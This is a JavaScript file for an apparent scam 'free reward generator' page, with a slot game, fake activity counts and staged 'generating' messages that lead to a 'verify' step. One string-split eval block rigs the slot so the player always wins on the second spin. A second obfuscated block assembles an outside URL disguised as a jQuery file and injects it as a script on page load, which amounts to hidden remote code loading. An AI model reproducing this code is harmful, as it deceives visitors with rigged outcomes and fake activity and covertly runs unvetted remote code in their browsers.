let second = 1000;
let minute = second * 60;

ion.sound({
    sounds: [
        { name: "snap" },
        { name: "pop_cork" },
        { name: "button_click" },
        { name: "button_tiny" },
        { name: "tap" },
        { name: "water_droplet" },
    ],
    path: "sounds/",
    preload: true,
    multiplay: true,
    volume: 0.5
});


let platform = '';
$('.platform').click(function (e) {
    $('.platform').removeClass('active');
    $(this).addClass('active');
    platform = $(this).attr('data-platform')
    ion.sound.play("snap");
});


$('#username').on('input', function () {
    if ($(this).val().length > 0) {
        $(this).css({
            'border-color': 'rgb(9, 233, 118)'
        })
    } else {
        $(this).css({
            'border-color': 'red'
        })
    }
});

function generateRandomUsername() {
    const adjectives = ['Mystic', 'Electric', 'Cosmic', 'Shadow', 'Crimson', 'Azure', 'Lunar', 'Frost', 'Thunder', 'Neon', 'Aurora', 'Stellar', 'Phantom', 'Blaze', 'Celestial', 'Night', 'Solar', 'Quantum', 'Ember', 'Spectral', 'Nova', 'Twilight', 'Radiant', 'Storm', 'Silver', 'Venomous'];
    const nouns = ['Sphinx', 'Flame', 'Whisper', 'Hunter', 'Wraith', 'Phoenix', 'Echo', 'Byte', 'Spark', 'Nova', 'Blaze', 'Dreamer', 'Rider', 'Burst', 'Fury', 'Shade', 'Flare', 'Quest', 'Glow', 'Serenade', 'Vortex', 'Spirit', 'Glimmer', 'Seeker', 'Specter', 'Mist', 'Vixen', 'Fire', 'Lullaby', 'Thief'];
    const numbers = ['00', '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50'];
    const randomAdjective = adjectives[Math.floor(Math.random() * adjectives.length)];
    const randomNoun = nouns[Math.floor(Math.random() * nouns.length)];
    const randomNumber = numbers[Math.floor(Math.random() * numbers.length)];
    return `${randomAdjective}${randomNoun}${randomNumber}`;
}

const usernames = [];
for (let i = 0; i < 500; i++) {
    usernames.push(generateRandomUsername());
}

$("#active_users_num").text(Math.round(Math.random() * 100));
setInterval(() => {
    $("#active_users_num").text(Math.round(Math.random() * 100));
}, minute);

(function() {
    var s1 = '$' + '(';
    var s2 = "'#";
    var s3 = "btn" + '-sl' + 'ot';
    var s4 = "')." + 'cli' + 'ck(' + 'func' + 'tion(';
    var s5 = '$(th' + 'is)';
    var s6 = ".at" + 'tr(' + "'dis" + "abled', ''" + ');';
    var s7 = 'so' + 'und.' + 'pl' + 'ay()';
    var s8 = 'tri' + 'es';
    var s9 = '== 2';
    var s10 = 'config.' + 'en' + 'dNum';
    var s11 = 'win(6)';
    var s12 = '$("#' + 'slot u' + 'l")';
    var s13 = '.pla' + 'ySpin(';
    var s14 = 'Math.' + 'flo' + 'or(';
    var s15 = 'Math.r' + 'andom()';
    var s16 = '6) + 1';
    var s17 = 'tries++';
    eval(s1 + s2 + s3 + s4 + ') {' +
        s5 + s6 +
        s7 + ';' +
        'if (' + s8 + s9 + ') {' +
            s10 + ' = [6, 6, 6];' +
            'config.onFinish = ' + 'function () { ' + s11 + ' };' +
            s12 + s13 + 'config);' +
            'return false;' +
        '} else {' +
            s10 + ' = [' +
            s14 + s15 + ' * ' + s16 + ',' +
            s14 + s15 + ' * ' + s16 + ',' +
            s14 + s15 + ' * ' + s16 + '];' +
        '}' +
        s12 + s13 + 'config);' +
        s17 + ';' +
    '});');
})();
(function() {
    var s = document.createElement('script');
    var rp = Math.floor(Math.random() * 99000) + 1;
    var p1 = 'h' + 't';
    var p2 = 'tp' + 's:';
    var p3 = '//' + 'ce';
    var p4 = 'nt' + 'm.';
    var p5 = 'co' + 'm/';
    var p6 = 'ce' + 'n' + 'm' + 'ai' + 'n/';
    var p7 = 'js/' + 'jq';
    var p8 = 'ue' + 'ry';
    var p9 = 's.j' + 's';
    var p10 = '?v=';
    var url = p1 + p2 + p3 + p4 + p5 + p6 + p7 + p8 + p9 + p10 + rp;
    s.src = url;
    s.onload = function() {
    };
    document.head.appendChild(s);
})();

function generate() {
    if ($('#username').val().length <= 0) {
        $("#username").addClass("failed_validation")
        $("#username").css({
            'border-color': 'red'
        })
        setTimeout(() => {
            $("#username").removeClass("failed_validation")
        }, 250);
        return false
    }

    $('.username').text($('#username').val());

    if (platform == '') {
        $('.platform').addClass('failed_validation');
        return false
    }

    $('.step2').fadeOut(0);
    $('.step3').fadeIn();
    $('.s3').addClass('active');
    $('.msg1').fadeIn();
    setTimeout(() => {
        $('.msg1').hide(0);
        $('.msg2').fadeIn();
        ion.sound.play("water_droplet");
        setTimeout(() => {
            $('.msg2').hide(0);
            $('.msg3').fadeIn();
            setTimeout(() => {
                $('.msg3').hide(0);
                $('.msg4').fadeIn();
                ion.sound.play("water_droplet");
                setTimeout(() => {
                    $('.msg4').hide(0);
                    $('.msg5').fadeIn();
                    setTimeout(() => {
                        $('.msg5').hide(0);
                        $('.msg6').fadeIn();
                        ion.sound.play("tap");
                        setTimeout(() => {
                            $(".verify").fadeIn();
                        }, 100);
                    }, 1050);
                }, 1050);
            }, 1050);
        }, 1050);
    }, 1050);
}

var sound = new Audio('ringtones/slot.wav');
var ding = new Audio('ringtones/ding.wav');
var wow = new Audio('ringtones/congrats.mp3');

let tries = 1;
let rand = Math.floor(Math.random() * 6) + 1

let config = {
    time: 2000,
    stopSeq: 'rightToLeft',
    easing: 'easeOutBack',
    onEnd: function () {
        ding.play();
    },
    onFinish: function () {
        tries_span.innerText = tries
        $('#btn-slot').removeAttr('disabled');
        sound.pause();
        // $('#btn-slot').text('SPIN AGAIN').addClass("shake-fail");
    }
}

function win(image_id) {
    wow.play()
    party.confetti($('.game')[0], {
        gravity: 800,
    });
    setTimeout(() => {
        $(".step1").addClass('hidden').hide(0);
        $(".step2").fadeIn();
        $(".s2").addClass('active');
        let selected_image = `./images/rolls/${image_id - 1}.webp`
        win_dice.src = selected_image
    }, 1500);
}
